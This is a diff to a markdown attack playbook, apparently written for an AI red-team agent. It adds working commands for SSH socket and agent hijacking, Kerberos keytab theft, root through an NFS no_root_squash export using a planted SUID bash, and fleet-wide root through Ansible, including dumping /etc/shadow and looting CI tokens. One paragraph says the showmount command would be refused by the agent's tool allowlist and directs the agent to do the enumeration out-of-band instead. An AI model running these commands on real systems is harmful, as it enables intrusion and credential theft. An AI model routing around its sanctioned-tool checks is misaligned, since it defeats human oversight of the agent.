@@ -87,6 +87,13 @@ cat ~/.bash_history; ls -la ~/.ssh; find / -name 'id_rsa' -o -name '*.pem' 2>/de
 ```
 Found a hash → `crack_hashes(domain, hash_type, hashes=...)`. Found a plaintext/cracked cred → `record_credential(domain, user, secret, valid_on=...)` then try it on every auth surface: `su`, SSH, the local DBs (`mysql -h127.0.0.1 -u.. -p..`, `psql -h127.0.0.1 ..`), and the 127.0.0.1 services from §2.3. Base64/hex-wrapped values are common — decode before cracking.
 
+### 2.6 SSH lateral-movement primitives (no cracking needed — abuse a live session/agent)
+
+A foothold user with an active or historical SSH session is a lateral path even without their password:
+- **ControlMaster socket hijack** — `ls -la ~/.ssh/*.sock /tmp/ssh-*/* /run/user/*/ssh-*` (or check `~/.ssh/config` for `ControlPath`). A live multiplexed socket lets you ride the existing authenticated connection with zero credentials: `ssh -S <socket-path> <original-target-user>@<original-target-host>`.
+- **SSH-agent forwarding hijack** — if `ForwardAgent yes` was used to reach this host, the agent socket is exposed: `find / -type s -name 'agent.*' 2>/dev/null` under `/tmp/ssh-*`, then `SSH_AUTH_SOCK=<found-socket> ssh-add -l` to confirm loaded keys, `SSH_AUTH_SOCK=<found-socket> ssh <user>@<next-host>` to pivot using a key you never touched. Root can steal any user's `SSH_AUTH_SOCK` from `/proc/<pid>/environ` even without a `/tmp` socket file.
+- **Keytab theft (Linux domain-joined / Kerberos)** — `find / -name '*.keytab' 2>/dev/null`, `/etc/krb5.keytab` (machine account), service keytabs under `/etc/security/keytabs/`. A stolen keytab authenticates as that principal without a password: `kinit -kt <file> <principal>` then reuse like any other Kerberos ticket (feeds the same ticket-conversion pipeline as `playbook-ad-lateral-delegation.md` §3 if the box is domain-joined).
+
 ## §3 File-transfer matrix (attacker ↔ victim)
 
 Serve from Kali: `python3 -m http.server 80` (or `impacket-smbserver share . -smb2support` for Windows).
@@ -111,6 +118,40 @@ Serve from Kali: `python3 -m http.server 80` (or `impacket-smbserver share . -sm
 ## §5 Kernel / distro CVE path (last, or when config vectors are dry)
 
 `uname -a` + `/etc/os-release` → `linux-exploit-suggester.sh` and `lookup_cve(product, version)`. Verify the exploit matches the exact kernel/build before firing (a public PoC for kernel A on kernel B usually needs an offset/struct adjustment, not a "not vulnerable"). Kernel exploits are noisy and can panic the box — prefer a config/cred path first; keep the kernel PoC as the fallback.
+
+## §6 NFS `no_root_squash` (root via a writable export)
+
+An NFS export shared with `no_root_squash` trusts the *client's* UID — files you create as root on your Kali box stay root-owned inside the export on the server. Drop a root-owned SUID binary into it, then execute that binary from your foothold shell for instant root.
+
+Discover exports (from Kali — reads the server's exports list on portmapper/2049):
+```
+showmount -e <target-ip>                 # lists exports + allowed clients
+cat /etc/exports                         # if you can read it from the foothold
+```
+Look for an export line ending in `no_root_squash` (and, ideally, writable by you). Exploit — mount as root on Kali, plant a root-SUID shell, trigger it on the victim:
+```
+mkdir /mnt/nfs && sudo mount -o rw,vers=3 <target-ip>:/exported/path /mnt/nfs
+sudo cp /bin/bash /mnt/nfs/rootbash && sudo chown root:root /mnt/nfs/rootbash
+sudo chmod u+s /mnt/nfs/rootbash         # SUID root, owned by root because no_root_squash
+# on the VICTIM shell, inside the export's local path:
+/exported/path/rootbash -p               # -p keeps euid=0 → root shell
+```
+`-p` is required — bash drops privileges without it. If the export isn't the one your foothold user lands in, note where the server mounts it locally (`mount` / `/etc/fstab` on the victim). `no_root_squash` needs no CVE — it is a config trust flaw; keep the planted binary benign and remove it after proving root (Rules 5-9).
+
+**`showmount` is not yet sanctioned** in `run_network_tool` (`tools/network/run_tool.py` `_SANCTIONED`) — running it through the tool layer would be refused today. Enumerate NFS out-of-band (or via `run_nmap` NSE `nfs-showmount`) and record the export with `record_redteam_action`; landing `showmount` as a sanctioned binary is owned by the agent who edits `run_tool.py`.
+
+## §7 Config-management / CI lateral movement (control-node = fleet root)
+
+A compromised automation control node is often the fastest path to root across *many* hosts at once — the trust flows outward from it, so owning it inherits its reach.
+
+- **Ansible control node** — if you land on a host with Ansible inventory + SSH/become access (readable `hosts` / `ansible.cfg`, a vault password file, or an agent-forwarded key), you have root RCE fleet-wide:
+  ```
+  ansible all --list-hosts                          # what the control node can reach
+  ansible <group> -m command -a 'id' --become       # runs as root on every managed host
+  ansible <group> -m shell -a 'cat /etc/shadow' --become   # loot — Rule 7: prove reach, don't mass-exfil
+  ```
+  Also loot the node itself: `ansible-vault` password files, `group_vars`/`host_vars` with plaintext or vaulted secrets, `.ssh/` keys the automation uses. Every credential → `record_credential` + `record_loot`.
+- **CI runner / Artifactory (related pattern)** — a self-hosted CI runner (GitLab/Jenkins/GitHub Actions) executes pipeline steps as its service account and holds deploy credentials; a writable pipeline definition or a job you can trigger is RCE as that account, and its stored registry/deploy tokens pivot to production. Artifactory/Nexus repos similarly leak baked-in service creds and deploy keys — hunt config for `ARTIFACTORY_`/`NPM_TOKEN`/`.npmrc`/`settings.xml` credentials, then reuse them (`record_credential`) against the registry and whatever it deploys to. Treat the CI/artifact plane as a credential store first, an RCE surface second.
 
 ## Evidence + Praetor integration
 
